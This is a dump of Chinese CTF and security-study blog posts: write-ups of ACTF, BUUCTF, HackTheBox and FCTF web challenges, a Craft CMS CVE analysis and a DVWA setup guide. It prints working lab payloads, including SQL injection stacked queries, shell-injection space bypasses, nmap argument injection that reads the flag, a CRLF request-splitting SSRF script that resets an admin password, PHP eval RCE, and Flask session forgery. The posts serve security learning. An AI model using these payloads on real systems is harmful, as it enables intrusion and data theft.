{"posts":[{"title":"ACTF","text":"MyGO’s Live!!!!!启动题目环境： 根路由 1234567891011app.get('/', (req, res) =&gt; { fs.readFile(__dirname + '/public/index.html', 'utf8', (err, data) =&gt; { if (err) { console.error(err); res.status(500).send('Internal Server Error'); } else { // Send the HTML content res.send(data); } })} /checker路由： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354app.get('/checker', (req, res) =&gt; { let url = req.query.url; if (url) { if (url.length &gt; 60) { res.send(&quot;我喜欢你&quot;); return; } url = [...url].map(escaped).join(&quot;&quot;); console.log(url); let host; let port; if (url.includes(&quot;:&quot;)) { const parts = url.split(&quot;:&quot;); host = parts[0]; port = parts.slice(1).join(&quot;:&quot;); } else { host = url; } let command = &quot;&quot;; // console.log(host); // console.log(port); if (port) { if (isNaN(parseInt(port))) { res.send(&quot;我喜欢你&quot;); return; } command = [&quot;nmap&quot;, &quot;-p&quot;, port, host].join(&quot; &quot;); // Construct the shell command } else { command = [&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host].join(&quot; &quot;); } var fdout = fs.openSync('stdout.log', 'a'); var fderr = fs.openSync('stderr.log', 'a'); nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], {stdio: [0,fdout,fderr] } ); nmap.on('exit', function (code) { console.log('child process exited with code ' + code.toString()); if (code !== 0) { let data = fs.readFileSync('stderr.log'); console.error(`Error executing command: ${data}`); res.send(`Error executing command!!! ${data}`); } else { let data = fs.readFileSync('stdout.log'); console.error(`Ok: ${data}`); res.send(`${data}`); } }); } else { res.send('No parameter provided.'); }}); 逐行解释： url变量从请求的url参数获值，如果url长度大于60渲染”我喜欢你”， 该行代码将url字符串分隔为字符数组逐个参与escaped()函数，最后再连接起来成为一个新的字符串 1url = [...url].map(escaped).join(&quot;&quot;); escaped()函数中一共过滤了以下字符： 123456789101112131415' '//空格'$''\\''`'//反引号'&quot;''|''&amp;'';''&lt;''&gt;''('')'''''\\n''*' 下面判断url中是否存在:，对host和port进行赋值 然后拼接构造一个nmap的命令，将各个字符串用空格分隔开拼接起来： 123456789if (port) { if (isNaN(parseInt(port))) { res.send(&quot;我喜欢你&quot;); return; } command = [&quot;nmap&quot;, &quot;-p&quot;, port, host].join(&quot; &quot;); // Construct the shell command} else { command = [&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host].join(&quot; &quot;);} 起一个bash进程执行nmap命令： 1nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], {stdio: [0,fdout,fderr] } ); 对nmap对象进行处理，发现： 123456789101112131415var fdout = fs.openSync('stdout.log', 'a');var fderr = fs.openSync('stderr.log', 'a');nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command], {stdio: [0,fdout,fderr] } );nmap.on('exit', function (code) { console.log('child process exited with code ' + code.toString()); if (code !== 0) { let data = fs.readFileSync('stderr.log'); console.error(`Error executing command: ${data}`); res.send(`Error executing command!!! ${data}`); } else { let data = fs.readFileSync('stdout.log'); console.error(`Ok: ${data}`); res.send(`${data}`); }}); 将报错结果存入stderr.log，将进程的运行结果存入stdout.log，(而不是过程中的) 那么如何获得nmap的运行结果呢？翻阅namp的使用手册，总结出了两个可以用的参数： -iL：从外部打开文件，读取里面的ip地址进行扫描； -oN：将执行结果存入外部文件中，可以将结果写入静态目录直接读取 使用-iL时发现如果打开的文件中不存在合法ip，返回的错误中就会存在文件的内容： 接下来只需要将这个报错的结果存到外部文件直接访问就好了，但是现在问题来了，上面被过滤了那么多的字符该怎么绕过 观察我们期望传入的字符，空格被ban了是最大的问题，曾经在另一篇文章中总结过相关的trick，这里$都被ban了，那么就试试{,}，Linux中可用{,}来无空格执行命令： 测试成功： 最后一个问题就是，在Dockerfile对flag的处理中发现flag被拼接上了-加上16个随机字符，思路是正则绕过，但是*被ban了，但是知道位数，可以用?来匹配： 最后将结果写入stdout.log： payload： 1http://192.168.64.1:36002/checker?url={-iL,/flag-????????????????,-oN,stdout.log} Easylatex一道xss 123456789101112app.post('/login', (req, res) =&gt; { let { username, password } = req.body if (md5(username) != password) { res.render('login', { msg: 'login failed' }) return } let token = sign({ username, isVip: false }) res.cookie('token', token) res.redirect('/')}) 查看路由以用户名的md5为密码进行登录，登陆成功后给Cookie中的token设置为非vip preview路由： 123456789101112app.get('/preview', (req, res) =&gt; { let { tex, theme } = req.query if (!tex) { tex = 'Today is \\\\today.' } const nonce = getNonce(16) let base = 'https://cdn.jsdelivr.net/npm/latex.js/dist/' if (theme) { base = new URL(theme, `http://${req.headers.host}/theme/`) + '/' } res.render('preview.html', { tex, nonce, base })}) base = new URL(theme, http://${req.headers.host}/theme/) + '/'这一段代码，theme我们是可控的 拼接完之后： 这道题XSS漏洞存在的关键是一个URL构造方法引起的，theme可控，我们可以把它指向自己的服务器： 服务器上装载恶意的js让网页来加载：","link":"/2023/11/01/ACTF/"},{"title":"BUUCTF","text":"EasySql先用用户名:1 密码:1’ 测试注入，页面报错，可能存在注入点，并且是字符型。 密码传入***1’ order by 4 #***时报错，判断出数据库有三个字段。 准备爆数据库名，二分法传入***1’ or (ascii(substr(database(),0,1))&lt;128)#***，结果直接拿到了flag。 题后反思：因为传入***1’ or (ascii(substr(database(),0,1))&lt;128)#*导致后端查询语句变成select * from 数据库名 where username = ‘1’ and pasword =’1’ or (ascii(substr(database(),0,1))&lt;128)#’***因为and优先级高于or，于是整个句子变成了两个部分： select * from 数据库名 where username = ‘1’ and pasword =’1’ 和 or (ascii(substr(database(),0,1))&lt;128)#’ 虽然用户名密码判断是错的，但是数据库名的第一个字符的ascii码确实小于128，为真，二者用or相连，返回为true，故登陆成功获取到flag； 但是这样做实际上是走弯路了，这道题布尔盲注不是最优解，实际上直接构造密码为***1’ or 1=1#***在原理上是和上面误打误撞拿到flag是一样的，但是少走了很多弯路。 easy_sql先传入1，返回一个字符串，传入1’，报错 可能存在sql注入，并且是字符型的。传入***’ order by 4#***，报错。 传入***’ order by 3#，报错。传入‘ order by 2#***不报错，判断表里有2个字段。 联合查询尝试失败，select被ban。尝试构造无字母数字的语句。编写脚本 123456789101112&lt;?php$var = 's';//依次将s改为e,l,e,c,t for($i=0;$i&lt;256;$i++){ for($j=0;$j&lt;256;$j++){ if(chr($i^$j)==$var){ echo (urlencode(chr($i)).&quot;^&quot;.urlencode(chr($j))); echo &quot;\\n&quot;; } } } ?&gt; 得到select，尝试能否绕过 1('%5D'^'.').('H'^'-').('%5D'^'1').('H'^'-').('_'^'%3C').('_'^'%2B') 还是没绕过，暂时放弃这条路。 查找学习show databases爆数据库名。 show tables爆表名，好臭的表名啊(。 ‘; show columns from `1919810931114514`;#爆字段名（表名要用反引号引起来） 万事俱备，只欠select，直接select不行，去查找能代替select的，果不其然，找到了handler语句。 1handler [表名] open;#打开表（句柄） 12handler [表名] read first;#从表的第一列开始读（指针的起点）handler [表名] read next;#指针往后一位，读取数据（参考资料https://blog.csdn.net/JesseYoung/article/details/40785137） 最终构造payload： 1';handler `1919810931114514` open;handler `1919810931114514` read first;# 拿到flag。 反思：除了上面的方法寻找mysql中的其他查询语句外，看了大佬们的wp后学到了更多的思路和相关知识，这道题还可以通过预编译得到flag。 预编译相关语法： 123set : #设置变量；prepare : #准备一个语句赋予其名称，之后直接调用语句；execute :#执行语句； 以及一个mysql语句concat(str1,str2)，将str1与str2连接起来返回连接后的字符串；或者mysql的hex()函数把语句变成十六进制同样可以绕过select的过滤。 步骤如下： 1set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);#创建一个变量@abc为字符串&quot;select * from `1919810931114514`&quot; 1prepare sel from @abc;#预备一个语句sel，内容是@abc，也就是&quot;select * from `1919810931114514`&quot; 1execute sel;#执行sel语句； 构造 1';set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel; 然后提示set被ban了，但是用的是strstr()，区分大小写，所以大写绕过 1';Set @abc=concat(&quot;selec&quot;,&quot;t * from `1919810931114514`&quot;);prepare sel from @abc;execute sel; 十六进制绕过的步骤如下： 打开mysql命令行输入 1select hex(&quot;select * from `191981096114514`&quot;); 得到一串十六进制字符串。 构造预处理语句： 1set @abc=73656C656374202A2066726F6D206031393139383130393631313435313460;prepare sel from @abc;execute sel; set同样大写绕过，payload： 121';Set @abc=0x73656C656374202A2066726F6D20603139313938313039333131313435313460;Prepare sel from @abc;execute sel;#(上面的图里应该是191981093114514打错了，最终结果应该是上面这行代码//到底是谁起的这个名字啊啊啊啊啊) GET到flag； 另外一种思路，从最开始看到题目的时候就在想直接输入1回显的数组是来自哪里的呢，但是最开始做的时候爆了191981093114514表就没爆words表的字段名了，因为191981093114514表里只有一个元素，所以推测回显内容是words表里的，爆words字段名 1';show columns from `words`;# 推测回显内容来自于data字段； 思路就是把words表改名为其他的名字，191981093114514改名为words，把其中的flag字段改名为id（或者在xinwords表里增加一列id），最后传入***1’ or 1=1#***使查询结果为true爆出words所有字段内容。 相关语句如下： 12345alter table [表名] add [字段名] int(***)/varchar(***) #增加列alter table [表名] drop [字段名]#删除列alter table [表名] change [字段名] [新字段名] int(***)/varchar(***)#重命名字段alter table [表名] rename to [新表名]#重命名表,to可省略rename table [表名] to [新表名]#重命名表 payload1: 11';rename table words to word;rename table `1919810931114514` to words;alter table words add id int(3);##新增一列id payload2： 121';rename table words to word;rename table `1919810931114514` to words;alter table words change flag id varchar(50);##修改flag字段名为id PingPingPing做这道题时想到前面做过的另外一题（新生赛exec）。总结了以下联合执行的符号作用： 1234p1;p2:&quot;先执行p1后执行p2;p1|p2:p1的输出作为p2的输入，只显示p2的结果；p1||p2:若p1为假则执行p2，为真停止执行；p1&amp;&amp;p2:若p1为真则执行p2，为假停止执行； 传入 1?ip=| ls 说实话一开始没反应过来space是空格的意思就没想着空格被过滤了（，单纯以为是表达错误不需要空格然后把空格删掉发现可以执行,直到下面cat命令没法正常执行时才反应过来是空格被ban了（。 提示空格被ban了，传入 1?ip=|ls 或者 1?ip=;ls 回显提示目录里有flag.php和index.php 直接 1?ip=|cat flag.php 然后提示空格被ban了。参考了大佬们的博客，大佬总结了以下几点绕过空格的方法： 1234567891011121314${IFS}$9{IFS}$IFS${IFS}$IFS$1 //$1改成$加其他数字貌似都行IFS&lt; &lt;&gt; {cat,flag.php} //用逗号实现了空格功能，需要用{}括起来%20 (space)%09 (tab)X=$'cat\\x09./flag.php';$X （\\x09表示tab，也可以用\\x20）#来自大佬博客：https://blog.csdn.net/vanarrow/article/details/108295481 逐一试下来发现$IFS$1是可行的但是提示flag被ban了（悲） 既然看不了flag又不知道过滤规则，反正还有个index.php能看 1?ip=|cat$IFS$1index.php 密密麻麻的这么多都被过滤了，括号引号星号全员过滤。。。想起之前从学长那里学来的星号绕过，也不能用了，没有头绪的时候。 正巧刚刚在学习绕过空格过滤的时候看到一篇博客，https://www.cnblogs.com/GLory-LTF/p/15359485.html。里面有讲到如果cat字符被ban了但是非得用cat命令，这里介绍了一种命令拼接绕过（记小本本）。 理论知道了，开始实践 嗯。。属于是学了点知识不会灵活变通了，再次求助大佬，给出的payload是 1?ip=;a=g;cat$IFS$1fla$a.php 又有收获了，拼接绕过不一定要每个字母都拼接，看着这个payload有个想法，如果把$a的位置在flag四个位置改变会怎么样。实践。 替换字符f的位置 替换字符l的位置 替换字符a的位置 看来只有g的位置可以。然后注意到$a是代码中原有的变量，如果构造payload时用的是b变量会怎么样呢 也是可行的 [HCTF 2018]admin 1记一次flask的session伪造： 先是发现admin用户被注册了，注册登陆界面经测试均不存在sql注入，先随便注册一个用户看看： 挨个页面去检索信息，最后在修改密码的页面的源码中发现了网站项目的代码： 现在做发现已经仓库404了(悲) 总而言之就是在flask在设置session时只是进行了简单的签名，然后放在前端的cookie中， Flask中的Session，它是存在于客户端的，也就是说我们在进行登录过后可以看到自己的Session值，而当我们对这个Session值进行base64解码后，就可以读取它的具体内容。 对应Flask，它在生成session时会使用app.config[‘SECRET_KEY’]中的值作为salt对session进行一个简单处理，那么这里的话，只要key不泄露，我们就只能得到具体内容，但是无法修改具体内容，因此这个时候就引发了一个问题，当key泄露的时候，就出现了内容伪造的情况，比如具体内容为{‘name’:’123’}，而当我们掌握key时，可修改内容为{‘name’:’admin’} 这道题其实就是在源码中没有把敏感数据去除导致secret_key泄露，去网上找大家的secret_key：”ckj123” 从cookie获取session： 用flask session工具解个码： 用法参考：https://github.com/noraj/flask-session-cookie-manager 改成admin重新生成一下session： 修改cookie： 另外此题也有其他具有参考意义的两种解法，unicode欺诈还有条件竞争： https://www.anquanke.com/post/id/164086","link":"/2023/03/09/BUUCTF/"},{"title":"CVE-2023-41892分析","text":"CraftCMS rce分析影响版本：4.0.0-RC1 &lt;= Craft CMS &lt;= 4.4.14 开源地址：https://github.com/craftcms/cms/releases/ 这里直接用ACTF2023的环境起：CraftCMS 搭建好环境： 先对src/vendor/craftcms/cms/src/controllers/ConditionsController.php进行分析： 问题出在了beforeAction()方法中，config参数和name参数是传入的请求体参数，可控。config传入json会被解码，然后返回数组赋值给$baseConfig，然后$baseCongig数组中的name键值赋值给$config。这里有几个方法，挨个分析下： remove()，返回并释放一个键值 123456789101112//ArrayHelper::remove() public static function remove(&amp;$array, $key, $default = null)//传入一个数组(传引用)，以及一个键名 { if (is_array($array) &amp;&amp; (isset($array[$key]) || array_key_exists($key, $array))) { $value = $array[$key]; unset($array[$key]);//将数组中键为key的键值对释放 return $value;//返回键值 } return $default; }","link":"/2023/12/30/CVE-2023-41892%E5%88%86%E6%9E%90/"},{"title":"DVWA","text":"搭建DVWA靶场前提：(1)本地配置好php环境 (2)下载DVWA源码：https://github.com/digininja/DVWA/archive/master.zip 具体步骤：1、下载并安装PHPstudy； 2、将解压后的DVWA源码放置在phpstudy安装目录的WWW文件夹； 3.进入DVWA/config目录，将config.inc.php.dist最后的.dist删去； 4、打开刚刚重命名的config.inc.php文件，修改db_user和db_password为”root”、”root”； 5、PHPstudy中启动服务器，访问http://127.0.0.1/DVWA/setup.php(或http://localhost/DVWA/setup.php))点击最下方的Creat Database； 如图所示就算启动成功了。 6、访问http://127.0.0.1/DVWA/(或http://localhost/DVWA/))，输入用户名”admin”密码”password”登录即可 DVWA靶场学习记录","link":"/2023/03/28/DVWA/"},{"title":"CVE-2023-47130分析","text":"","link":"/2023/12/30/CVE-2023-47130%E5%88%86%E6%9E%90/"},{"title":"HELLO","text":"Just a test:)My first blog1terces=d712373303471becd6f647f54703e6f5d696b7f6471647f607","link":"/2023/02/08/HELLO/"},{"title":"HTB_note","text":"Hack The Box做题记录Phonebook 一个登录界面，下面提示用Reese登录，看到登录框试着SQL注入，但是发现不管什么姿势都没用，再观察，发现输入错误时会请求一个GET参数message， 可能这里也有漏洞，尝试了下xss，&lt;img src=x onerror=alert(1)&gt; 确实存在xss漏洞，但是经观察，并不能对其利用，那试试模板注入： 这里不止试了这一种，用tplmap跑了一遍所有的模板引擎的情况，都不行，大概模板注入也是走不通了 去找hint吧。。看了别人到这的做法，是在密码传入通配符’*’？？未曾设想的道路。 然后跳转到这样一个页面，在搜索框里随便输入一个1，显示出挺多的， 在搜索框也是一顿暴锤，按刚刚的姿势把*输入返回无搜索结果，然后发现*后面随便输一个字符发现居然蹦出好多， 那。。推测不就是正则表达式了吗？理解了题意之后去/login页面，传入： 发生了跳转，*代表匹配前面的字符任意次(零次或多次)，如ab*表示匹配a后面跟着任意个连续的b，可匹配a,ab,abb等，a*b可匹配任意个连续的a开头，后面跟一个b，可匹配b,ab,aab等，a*b*c匹配任意个连续的a开头，后跟任意个连续的b，最后以一个c结尾，如c,ac,bc,abc,aabc,abbc,aaabbc等 '.'(点号)：匹配任意单个字符，除换行符。eg：a.b可匹配aab,axb,a@b等 .*就形成了贪婪匹配，匹配以a开头，后跟任意个字符，最后以b结尾，如axyzb，a@qqb等 '?'(问号)：表示匹配前面的字符0次或1次，如ab?可匹配ab或a +(加号)：表示匹配前面的字符一次或多次 {n}：表示匹配前面的字符恰好n次，如a{3}表示匹配恰好三个连续的a字符 {n,}：表示匹配前面的字符至少n次，如，a{2,}可匹配aabcd,aaabcd等 {n,m}：表示匹配前面的字符至少n次，最多m次 []：表示字符类，匹配其中的任意一个字符，如[abc]可匹配a,b或c [^]：表示否定字符类，匹配除了其中字符外的任意字符 这里我们根据*匹配前面的字符任意次，我们编写脚本： 1234567891011121314151617181920import requestspre = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_}{?!@#$%^&amp;*&lt;&gt;'url = 'http://167.172.61.89:32269/login'flag = ''for i in range(0,60): for char in pre: print(char) payload = flag + char + '*'#逐步判断H*,HT*,HTB*,HTB{*等等 r = requests.post(url,data={ 'username':'Reese', 'password':payload }).text if 'success' in r: flag += char print(flag) break WeatherApp打开之后是这样一个页面： 审计源代码：./index.js： ./routes/index.js： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768const path = require('path');const fs = require('fs');const express = require('express');const router = express.Router();const WeatherHelper = require('../helpers/WeatherHelper');let db;const response = data =&gt; ({ message: data });router.get('/', (req, res) =&gt; { return res.sendFile(path.resolve('views/index.html'));});router.get('/register', (req, res) =&gt; { return res.sendFile(path.resolve('views/register.html'));});router.post('/register', (req, res) =&gt; { if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') { return res.status(401).end(); } let { username, password } = req.body; if (username &amp;&amp; password) { return db.register(username, password) .then(() =&gt; res.send(response('Successfully registered'))) .catch(() =&gt; res.send(response('Something went wrong'))); } return res.send(response('Missing parameters'));});router.get('/login', (req, res) =&gt; { return res.sendFile(path.resolve('views/login.html'));});router.post('/login', (req, res) =&gt; { let { username, password } = req.body; if (username &amp;&amp; password) { return db.isAdmin(username, password) .then(admin =&gt; { if (admin) return res.send(fs.readFileSync('/app/flag').toString()); return res.send(response('You are not admin')); }) .catch(() =&gt; res.send(response('Something went wrong'))); } return re.send(response('Missing parameters'));});router.post('/api/weather', (req, res) =&gt; { let { endpoint, city, country } = req.body; if (endpoint &amp;&amp; city &amp;&amp; country) { return WeatherHelper.getWeather(res, endpoint, city, country); } return res.send(response('Missing parameters'));}); module.exports = database =&gt; { db = database; return router;}; 12345678910111213141516router.post('/register', (req, res) =&gt; { if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') { return res.status(401).end(); } let { username, password } = req.body; if (username &amp;&amp; password) { return db.register(username, password) .then(() =&gt; res.send(response('Successfully registered'))) .catch(() =&gt; res.send(response('Something went wrong'))); } return res.send(response('Missing parameters'));}); 从上面我们可以看到/register路由的配置，在访问/register时需要用户的远程IP为本地回环地址，否则就会返回401状态码，也就是说只有内网才能访问，就很容易想到SSRF利用存在可能性，有看到一个register()方法，追踪去看这个函数，在database.js中，这里register()没有用使用预编译SQL语句，而是直接拼接字符串，存在SQL注入利用的可能性： 1234567891011async register(user, pass) { // TODO: add parameterization and roll public return new Promise(async (resolve, reject) =&gt; { try { let query = `INSERT INTO users (username, password) VALUES ('${user}', '${pass}')`; resolve((await this.db.run(query))); } catch(e) { reject(e); } });} 然后是/login路由，这里就能看到/flag的获取渠道了，需要经过isAdmin()方法的验证以admin身份登录。 1234567891011121314router.post('/login', (req, res) =&gt; { let { username, password } = req.body; if (username &amp;&amp; password) { return db.isAdmin(username, password) .then(admin =&gt; { if (admin) return res.send(fs.readFileSync('/app/flag').toString()); return res.send(response('You are not admin')); }) .catch(() =&gt; res.send(response('Something went wrong'))); } return re.send(response('Missing parameters'));}); 顺着去找isAdmin()方法，在database.js中，这里查询用的预编译： 1234567891011async isAdmin(user, pass) { return new Promise(async (resolve, reject) =&gt; { try { let smt = await this.db.prepare('SELECT username FROM users WHERE username = ? and password = ?'); let row = await smt.get(user, pass); resolve(row !== undefined ? row.username == 'admin' : false); } catch(e) { reject(e); } });} database.js这里migrate()函数中在创建admin用户时生成了个32位的随机数然后再转16进制再经过加密，爆破是几乎不可能的了 12345678910111213async migrate() { return this.db.exec(` DROP TABLE IF EXISTS users; CREATE TABLE IF NOT EXISTS users ( id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, username VARCHAR(255) NOT NULL UNIQUE, password VARCHAR(255) NOT NULL ); INSERT INTO users (username, password) VALUES ('admin', '${ crypto.randomBytes(32).toString('hex') }'); `);} /api/waether，这个路由中，let { endpoint, city, country } = req.body;将POST请求的参数赋给{ endpoint, city, country }，调用WeatherHelper中的getWeather()方法，参数为res, endpoint, city, country 123456789router.post('/api/weather', (req, res) =&gt; { let { endpoint, city, country } = req.body; if (endpoint &amp;&amp; city &amp;&amp; country) { return WeatherHelper.getWeather(res, endpoint, city, country); } return res.send(response('Missing parameters'));}); ，那就顺着思路往下看WeatherHelper.js，就是请求一个api然后返回城市数据气温等等信息： 1234567891011121314151617181920212223242526272829303132333435363738394041424344const HttpHelper = require('../helpers/HttpHelper');module.exports = { async getWeather(res, endpoint, city, country) { // *.openweathermap.org is out of scope let apiKey = '10a62430af617a949055a46fa6dec32f'; let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&amp;units=metric&amp;appid=${apiKey}`); if (weatherData.name) { let weatherDescription = weatherData.weather[0].description; let weatherIcon = weatherData.weather[0].icon.slice(0, -1); let weatherTemp = weatherData.main.temp; switch (parseInt(weatherIcon)) { case 2: case 3: case 4: weatherIcon = 'icon-clouds'; break; case 9: case 10: weatherIcon = 'icon-rain'; break; case 11: weatherIcon = 'icon-storm'; break; case 13: weatherIcon = 'icon-snow'; break; default: weatherIcon = 'icon-sun'; break; } return res.send({ desc: weatherDescription, icon: weatherIcon, temp: weatherTemp, }); } return res.send({ error: `Could not find ${city} or ${country}` }); }} 其中的HttpHelper.HttpGet()方法是访问一个api并接受处理返回的数据，以json返回，重点在于，这里是通过服务端进行一次get请求的，并且endpoint等参数在前面看到过，是可控的 12345678910111213141516171819const http = require('http');module.exports = { HttpGet(url) { return new Promise((resolve, reject) =&gt; { http.get(url, res =&gt; { let body = ''; res.on('data', chunk =&gt; body += chunk); res.on('end', () =&gt; { try { resolve(JSON.parse(body)); } catch(e) { resolve(false); } }); }).on('error', reject); }); }} 全部代码看了一遍下来还是不知道ssrf的点在哪里，改过XFF为127.0.0.1也不行。无奈去看了点提示，发现package.json的内容我都没看过，wp看到注意nodejs的版本，是8.12.0，于是去谷歌开始search相关版本的漏洞，重点注意ssrf的， 找了很久也是一路顺藤摸瓜找到了这篇文章：文章，是关于nodejs的请求分割，CRLF(HTTP响应拆分攻击) 简单理解就是node在实际发起请求前，对url的处理是使用多字节的unicode编码解析，如果传入数据中包含恶意设计的unicode编码，在解析之后就会变为字符(如\\r\\n)，就会造成请求分割。 1234将空格编码为\\u0120\\r编码为\\u010D\\n编码为\\u010A引号等其余字符url编码 脚本： 1234567891011121314151617181920212223242526272829303132333435import urllib.parseimport requestsurl = 'http://157.245.39.76:31090/api/weather'username = 'admin'password = &quot;') on conflict(username) do update set password = '11';--&quot;username = urllib.parse.quote(username)password = urllib.parse.quote(password)#print(username)#print(password)content_length = len(f&quot;username={username}&amp;password={password}&quot;)payload = \\f&quot;&quot;&quot;127.0.0.1/ HTTP/1.1Host: 127.0.0.1POST /register HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: {content_length}Connection: closeusername={username}&amp;password={password}GET /&quot;&quot;&quot;#此处用于闭合HttpHelper.HttpGet()传入endpoint后面的部分endpoint = payload.replace(' ','\\u0120').replace('\\n','\\u010A').replace('\\r','\\u010D')city = 'city'country = 'cn'#print(endpoint)r = requests.post(url,json={'endpoint':endpoint,'city':city,'country':country}).status_codeprint(r) 这里要讲一下SQLite中的ON CONFLICT语句，在SQLite数据库中，”ON CONFLICT” 是一种用于处理插入操作中发生冲突的机制。当尝试向表中插入一行数据时，如果违反了某些约束（例如唯一性约束），就会发生冲突。”ON CONFLICT” 子句允许你指定在发生冲突时应该如何处理。 常见的用法是在 INSERT 语句中使用 “ON CONFLICT” 子句。以下是一些示例： 忽略冲突：INSERT OR IGNORE INTO table_name … 会忽略冲突并继续执行。 替换（Replace）：INSERT OR REPLACE INTO table_name … 会尝试插入数据，如果发生冲突，会先删除原有数据然后插入新数据。 更新（Update）：INSERT OR REPLACE INTO table_name … 会尝试插入数据，如果发生冲突，会更新冲突行的数据。 回滚（Rollback）：INSERT OR ROLLBACK INTO table_name … 在发生冲突时会回滚整个事务，不会插入数据。 这里利用的是on confilct update 使用密码11登录 LoveTok页面如下： 查看源代码： TimeControllor.php： 12345678910&lt;?phpclass TimeController{ public function index($router) { $format = isset($_GET['format']) ? $_GET['format'] : 'r'; $time = new TimeModel($format); return $router-&gt;view('index', ['time' =&gt; $time-&gt;getTime()]); }} 定义了一个TimeController类，类里定义了一个index()方法，其中format变量通过GET请求传入，否则默认为r，然后实例化一个TimeModel类，传入format参数，再返回一个路由渲染，渲染time值为time类中的getTime()方法， TimeModel.php： 1234567891011121314151617&lt;?phpclass TimeModel{ public function __construct($format) { $this-&gt;format = addslashes($format); [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+${d} day +${h} hour +${m} minute +${s} second&quot;; } public function getTime() { eval('$time = date(&quot;' . $this-&gt;format . '&quot;, strtotime(&quot;' . $this-&gt;prediction . '&quot;));'); return isset($time) ? $time : 'Something went terribly wrong'; }} 定义了一个TimeModel类，类里定义了一个构造函数和一个getTime函数，构造函数参数为format，然后addslashes转义掉单双引号，再随机生成一个日期时间，然后组成一个时间的字符串；getTime()方法中有一个eval ()函数，用于格式化日期时间，最后返回时间。 那这里的eval函数就存在可能的rce，这里有一个前置知识，在date函数中使用一个与时间无关的任意字符串作为format参数 ，函数会将这个字符串原样输出，而不会进行日期和时间格式化，于是这里传入${phpinfo()}，存在rce 那就用system()函数执行命令吧，然后问题就来了，题目把引号转义了，不过不同的题目思想都是类似可以相互借鉴的，ssti那边将引号ban了之后采用的是将字符串用GET或者POST传参或者放入header或cookie里，这里就把命令放入GET参数中： 这里还想出来另外一种方法，既然无法使用引号包装shell字符串，那就不用呗，用反引号也能执行系统命令，但是无法输出结果，这时候我们只需要使用输出语句print_r()或echo或var_dump()将结果输出即可，这里echo不知道为什么500了，print_r()和var_dump()可以完美实现：","link":"/2023/08/03/HTB-note/"},{"title":"Metasploit","text":"Msf学习笔记","link":"/2023/03/28/Metasploit/"},{"title":"2023FCTF","text":"2023FCTF热身赛WebViewSource一道简单的前端题，根据提示ViewSource，ctrl+u查看源代码，这里网页代码被加密过了，直接往下看发现可疑段落 分析逻辑，用户输入your_flag，如果your_flag与my_flag相同，则弹窗my_flag 提供两种做法 既然my_flag变量在js代码中定义，那么我们就能用控制台把它输出 ctrl+s保存网页源代码用编辑器打开 修改代码逻辑，如果用户输入的your_flag与实际flag不相等则弹窗my_flag，保存，打开html文件往输入框里随便输个什么提交 javaDeserialize-1 点开题目， javaDeserialize-2 filechecker_mini打开题目，让我们上传一个文件： 桌面上随便丢了个php文件进去提交看看会有啥情况： 判断文件类型，(MIME绕过预定) 附件下载下来先看源码： index.html： 可以看出该网页使用模块渲染将result值渲染进index对应位置，那么就看下后端代码app.py： 123456789101112131415161718192021222324252627282930313233343536373839from flask import Flask, request, render_template, render_template_stringfrom waitress import serveimport osimport subprocessapp_dir = os.path.split(os.path.realpath(__file__))[0]app = Flask(__name__)app.config['UPLOAD_FOLDER'] = f'{app_dir}/upload/'@app.route('/', methods=['GET','POST'])def index(): try: if request.method == 'GET': return render_template('index.html',result=&quot;ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿 ヽ(=^･ω･^=)丿&quot;) elif request.method == 'POST': f = request.files['file-upload'] filepath = os.path.join(app.config['UPLOAD_FOLDER'], f.filename) if os.path.exists(filepath) and &quot;..&quot; in filepath: return render_template('index.html', result=&quot;Don't (^=◕ᴥ◕=^) (^=◕ᴥ◕=^) (^=◕ᴥ◕=^)&quot;) else: f.save(filepath) file_check_res = subprocess.check_output( [&quot;/bin/file&quot;, &quot;-b&quot;, filepath], shell=False, encoding='utf-8', timeout=1 ) os.remove(filepath) if &quot;empty&quot; in file_check_res or &quot;cannot open&quot; in file_check_res: file_check_res=&quot;wafxixi ฅ•ω•ฅ ฅ•ω•ฅ ฅ•ω•ฅ&quot; return render_template_string(file_check_res) except: return render_template('index.html', result='Error ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ ฅ(๑*д*๑)ฅ')if __name__ == '__main__': serve(app, host=&quot;0.0.0.0&quot;, port=3000, threads=1000, cleanup_interval=30) 上面大家都用render_template()就你爱用render_template_string()是吧（指指点点，一眼模板注入，那么我们就希望file_check_res里有我们能够执行的rce代码。file_check_res哪来的？倒退往上看。 12345678f.save(filepath)file_check_res = subprocess.check_output( [&quot;/bin/file&quot;, &quot;-b&quot;, filepath], shell=False, encoding='utf-8', imeout=1 )os.remove(filepath) 先保存filepath这样一个文件，subprocess.check_output(command)返回Linux命令行输出，然后再把filepath文件删除，那么这里的file_check_res就是file -b {filepath}的结果。往上看filepath其实就是将上传文件目录的绝对路径和该文件的文件名拼接起来来标定用户上传的这个文件在容器中的绝对位置。逻辑搞明白了，现在的重点就在于如何对一个文件使用file -b 命令后返回值中能回显我们所期望的值。动手操作下flie命令，发现其不会输出文件的内容只会输出其类型， 代码中的-b参数作用： 1-b #列出辨识结果时，不显示文件名称。 所以在文件名上动手脚的想法也破灭了（悲。 卡住了，向大佬博客寻求帮助，去guthub查找file命令源码。第一个仓库点开。 点开tests里面是各种针对该file命令的测试结果 这8个分别分别是在文本中写入bash脚本的4种情况和对应的用file命令执行的输出结果，可以看出如果文本内容为#!/usr/bin开头的那么输出结果中会显示文本中的其他内容。 